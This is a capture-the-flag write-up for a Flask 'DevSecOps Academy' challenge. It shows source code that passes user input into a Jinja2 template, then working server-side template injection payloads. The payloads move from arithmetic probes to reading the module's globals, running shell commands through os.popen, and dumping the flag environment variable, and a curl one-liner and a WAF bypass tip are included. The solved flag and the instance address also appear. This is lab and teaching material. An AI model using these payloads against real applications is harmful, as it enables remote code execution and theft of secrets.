# Shift-Left, Brain-Right — Solved

**Instance:** `193.168.46.146:30452`
**Stack:** Flask / Werkzeug 3.1.9, Python 3.12 (GZCTF platform)
**Flag:** `KubSTU{S46t_1s_C00l_0ba176a53ad3}`

> The challenge description says the flag format is `KubCTF{...}`, but the platform's own flag
> environment variable (`GZCTF_FLAG`) is `KubSTU{...}` — that value is the real flag.

---

## 1. Vulnerability — Jinja2 SSTI (server-side template injection)

The site is a "DevSecOps Academy" course landing page with a search box:
`GET /?course=<value>`.

`/app/app.py`:

```python
from flask import Flask, request, render_template_string
app = Flask(__name__)
PAGE = '''…<div class="result-value">__COURSE_QUERY__</div>…'''

@app.route('/')
def index():
    course_query = request.args.get('course', 'Введение в DevSecOps')

    # УЯЗВИМОСТЬ: пользовательский ввод подставляется в исходный текст
    # шаблона ДО его компиляции в Jinja2
    template = PAGE.replace('__COURSE_QUERY__', course_query)
    return render_template_string(template)
```

The user's input is substituted into the **template source string** *before* it is handed to
`render_template_string()`. That is the classic SSTI sink (it is exactly what a SAST rule for
"user input reaching a template engine" flags — hence the "shift-left" theme).

---

## 2. Exploitation

### Confirm injection
```
GET /?course={{7*7}}      →  …<div class="result-value">49</div>
GET /?course={{7*"7"}}    →  7777777
```

### Read the environment (Jinja globals)
```
GET /?course={{ cycler.__init__.__globals__ }}
```
dumps `jinja2.utils` globals, which include the `os` module and `__builtins__`.

### Command execution
```
GET /?course={{ cycler.__init__.__globals__.os.popen('id').read() }}
→ uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)
```

> A WAF blocks the `__import__("os")` form (the request is dropped). `cycler.__init__.__globals__.os`
> is already present, so no import is needed.

### Read the flag
```
GET /?course={{ cycler.__init__.__globals__.os.popen('printenv GZCTF_FLAG').read() }}
→ KubSTU{S46t_1s_C00l_0ba176a53ad3}
```

(For multi-line output, pipe through `base64 -w0` and decode locally — the app HTML-escapes the
result and newlines break simple extraction.)

---

## 3. One-liner

```bash
T=193.168.46.146:30452
curl -s -G --data-urlencode \
  "course={{ cycler.__init__.__globals__.os.popen('printenv GZCTF_FLAG').read() }}" \
  "http://$T/" | grep -o 'result-value">[^<]*'
```

## 4. Flag

```
KubSTU{S46t_1s_C00l_0ba176a53ad3}
```
